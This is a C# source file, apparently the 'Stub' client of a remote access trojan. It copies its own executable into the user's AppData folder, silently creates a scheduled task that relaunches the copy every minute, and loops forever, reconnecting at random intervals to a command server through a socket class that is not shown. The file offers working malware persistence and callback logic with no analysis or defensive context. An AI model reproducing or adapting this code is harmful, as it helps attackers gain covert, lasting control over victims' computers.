using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class Main
{
	[STAThread]
	public static void Main()
	{
		Thread.Sleep(1000);
		if (!Helper.CreateMutex())
		{
			Environment.Exit(0);
		}
		string text = Interaction.Environ("appdata");
		string text2 = text + "\\" + Path.GetFileName(Settings.current);
		try
		{
			File.Copy(Settings.current, text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks.exe");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.Arguments = "/create /f /sc minute /mo 1 /tn \"" + Path.GetFileNameWithoutExtension(Settings.current) + "\" /tr \"" + text2 + "\"";
			Process process = Process.Start(processStartInfo);
			process.WaitForExit();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		Thread thread = new Thread((ThreadStart)delegate
		{
			while (true)
			{
				Thread.Sleep(new Random().Next(1000, 5000));
				if (!ClientSocket.isConnected)
				{
					ClientSocket.isDisconnected();
					ClientSocket.BeginConnect();
				}
				ClientSocket.allDone.WaitOne();
			}
		});
		thread.Start();
		thread.Join();
	}
}
